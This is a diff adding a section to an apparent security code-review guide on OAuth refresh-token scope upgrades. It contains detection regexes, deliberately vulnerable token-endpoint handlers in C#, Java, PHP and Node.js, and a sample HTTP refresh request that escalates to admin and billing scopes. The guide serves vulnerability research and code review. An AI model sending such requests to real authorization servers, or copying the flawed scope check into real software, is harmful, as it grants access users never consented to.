@@ -1183,4 +1183,229 @@ If the full admin response returns despite a `scope` of `partner.read` and a `cl
 {% endstep %}
 {% endstepper %}
 
+***
+
+#### OAuth Refresh-Token Scope Upgrade Bypassing Original User Consent
+
+{% stepper %}
+{% step %}
+Map the entire target system using Burp Suite
+{% endstep %}
+
+{% step %}
+Draw the entry points and endpoints in XMind
+{% endstep %}
+
+{% step %}
+Decompile the application based on the programming language used
+{% endstep %}
+
+{% step %}
+Register or reuse an OAuth client and complete a normal authorization-code flow, deliberately granting only a narrow scope at the consent screen (e.g. `profile.read`), then capture the resulting refresh token
+{% endstep %}
+
+{% step %}
+In the decompiled code of the authorization server's token endpoint, locate the handler for `grant_type=refresh_token` and determine whether it accepts an optional `scope` parameter on the refresh request itself
+{% endstep %}
+
+{% step %}
+If a `scope` parameter is accepted, determine exactly what it is validated against — the scope the user actually consented to during the original `authorization_code` exchange (the only legitimate ceiling), or simply the full set of scopes the client application is registered for in the authorization server's client registry, which is typically far broader than anything a specific user has agreed to
+{% endstep %}
+
+{% step %}
+Check whether the originally consented scope is persisted alongside the refresh token (e.g. as a field on the token record itself) and whether the refresh handler actually reads and intersects the request against it, or whether it disregards that field entirely once a refresh token exists and validates only against the client's registered capability
+{% endstep %}
+
+{% step %}
+If the refresh endpoint widens scope up to the client's full registered capability rather than down to the original consented grant, request a refresh on the existing refresh token while supplying a broader `scope` value than the user ever approved
+
+**VSCode (Regex Detection)**
+
+{% tabs %}
+{% tab title="C#" %}
+```regexp
+(grant_type.*refresh_token)|(client\.RegisteredScopes)|(HandleRefreshTokenGrant)
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```regexp
+("refresh_token"\.equals\(grantType\))|(client\.getRegisteredScopes\(\))|(handleRefreshTokenGrant)
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```regexp
+(\$grantType === 'refresh_token')|(\$client->registeredScopes)|(handleRefreshTokenGrant)
+```
+{% endtab %}
+
+{% tab title="Node.js" %}
+```regex
+(grantType === 'refresh_token')|(client\.registeredScopes)|(handleRefreshTokenGrant)
+```
+{% endtab %}
+{% endtabs %}
+
+**RipGrep (Regex Detection(Linux))**
+
+{% tabs %}
+{% tab title="C#" %}
+```regexp
+grant_type.*refresh_token|client\.RegisteredScopes|HandleRefreshTokenGrant
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```regexp
+"refresh_token"\.equals\(grantType\)|client\.getRegisteredScopes\(\)|handleRefreshTokenGrant
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```regexp
+\$grantType === 'refresh_token'|\$client->registeredScopes|handleRefreshTokenGrant
+```
+{% endtab %}
+
+{% tab title="Node.js" %}
+```regex
+grantType === 'refresh_token'|client\.registeredScopes|handleRefreshTokenGrant
+```
+{% endtab %}
+{% endtabs %}
+
+**Vulnerable Code Pattern**
+
+{% tabs %}
+{% tab title="C#" %}
+```c#
+public TokenResponse HandleRefreshTokenGrant(RefreshTokenRequest req)
+{
+    var refreshToken = _refreshTokenStore.Get(req.RefreshToken);
+    if (refreshToken == null || refreshToken.Revoked)
+        throw new InvalidGrantException();
+
+    var client = _clientStore.GetById(refreshToken.ClientId);
+
+    var requestedScope = string.IsNullOrEmpty(req.Scope)
+        ? refreshToken.OriginalScope
+        : req.Scope; // [1] a client-supplied scope on the refresh request is honored at all
+
+    var allowedScope = requestedScope
+        .Split(' ')
+        .Where(s => client.RegisteredScopes.Contains(s)) // [2] validated only against what the client is capable of requesting, never against refreshToken.OriginalScope
+        .ToList();
+
+    var accessToken = _tokenIssuer.IssueAccessToken(refreshToken.UserId, allowedScope); // [3] the new access token can carry far more scope than the user ever consented to
+    return new TokenResponse { AccessToken = accessToken, Scope = string.Join(' ', allowedScope) };
+}
+```
+{% endtab %}
+
+{% tab title="Java" %}
+```java
+public TokenResponse handleRefreshTokenGrant(RefreshTokenRequest req) {
+    RefreshToken refreshToken = refreshTokenStore.get(req.getRefreshToken());
+    if (refreshToken == null || refreshToken.isRevoked()) {
+        throw new InvalidGrantException();
+    }
+
+    Client client = clientStore.getById(refreshToken.getClientId());
+
+    String requestedScope = (req.getScope() == null || req.getScope().isEmpty())
+        ? refreshToken.getOriginalScope()
+        : req.getScope(); // [1] a client-supplied scope on the refresh request is honored at all
+
+    List<String> allowedScope = Arrays.stream(requestedScope.split(" "))
+        .filter(client.getRegisteredScopes()::contains) // [2] validated only against what the client is capable of requesting, never against refreshToken.getOriginalScope()
+        .collect(Collectors.toList());
+
+    String accessToken = tokenIssuer.issueAccessToken(refreshToken.getUserId(), allowedScope); // [3] the new access token can carry far more scope than the user ever consented to
+    return new TokenResponse(accessToken, String.join(" ", allowedScope));
+}
+```
+{% endtab %}
+
+{% tab title="PHP" %}
+```php
+function handleRefreshTokenGrant($req) {
+    $refreshToken = RefreshTokenStore::get($req['refresh_token']);
+    if ($refreshToken === null || $refreshToken->revoked) {
+        throw new InvalidGrantException();
+    }
+
+    $client = ClientStore::getById($refreshToken->clientId);
+
+    $requestedScope = empty($req['scope'])
+        ? $refreshToken->originalScope
+        : $req['scope']; // [1] a client-supplied scope on the refresh request is honored at all
+
+    $allowedScope = array_filter(
+        explode(' ', $requestedScope),
+        fn($s) => in_array($s, $client->registeredScopes) // [2] validated only against what the client is capable of requesting, never against $refreshToken->originalScope
+    );
+
+    $accessToken = TokenIssuer::issueAccessToken($refreshToken->userId, $allowedScope); // [3] the new access token can carry far more scope than the user ever consented to
+    return ['access_token' => $accessToken, 'scope' => implode(' ', $allowedScope)];
+}
+```
+{% endtab %}
+
+{% tab title="Node.js" %}
+```js
+async function handleRefreshTokenGrant(req) {
+  const refreshToken = await refreshTokenStore.get(req.refresh_token);
+  if (!refreshToken || refreshToken.revoked) {
+    throw new InvalidGrantError();
+  }
+
+  const client = await clientStore.getById(refreshToken.clientId);
+
+  const requestedScope = req.scope
+    ? req.scope // [1] a client-supplied scope on the refresh request is honored at all
+    : refreshToken.originalScope;
+
+  const allowedScope = requestedScope
+    .split(' ')
+    .filter(s => client.registeredScopes.includes(s)); // [2] validated only against what the client is capable of requesting, never against refreshToken.originalScope
+
+  const accessToken = await tokenIssuer.issueAccessToken(refreshToken.userId, allowedScope); // [3] the new access token can carry far more scope than the user ever consented to
+  return { access_token: accessToken, scope: allowedScope.join(' ') };
+}
+```
+{% endtab %}
+{% endtabs %}
+{% endstep %}
+
+{% step %}
+Note the markers: `[1]` the refresh request's own `scope` parameter overrides the originally consented scope the moment it is present, `[2]` the only ceiling actually enforced is the client's full registered capability, `[3]` the resulting access token can legitimately carry scope nobody ever consented to at any consent screen
+{% endstep %}
+
+{% step %}
+Refresh the token captured in step 4 while supplying a scope value wider than what the user approved
+
+```http
+POST /oauth/token HTTP/1.1
+Host: auth.target.tld
+Content-Type: application/x-www-form-urlencoded
+
+grant_type=refresh_token&refresh_token=<token-issued-for-profile.read-only>&client_id=reporting-app&scope=profile.read%20admin.write%20billing.write
+```
+
+```http
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{"access_token":"eyJhbGciOiJSUzI1NiJ9...","scope":"profile.read admin.write billing.write","token_type":"Bearer"}
+```
+{% endstep %}
+
+{% step %}
+If the response grants any scope beyond `profile.read` — anything the client is merely registered to be capable of rather than what the user actually approved — the refresh-token endpoint has silently escalated the token's effective privileges with no new consent prompt shown to anyone, confirming a scope-upgrade vulnerability that turns any narrowly consented grant into a standing path toward the client's full registered capability
+{% endstep %}
+{% endstepper %}
+
+***
+
 ## Cheat Sheet
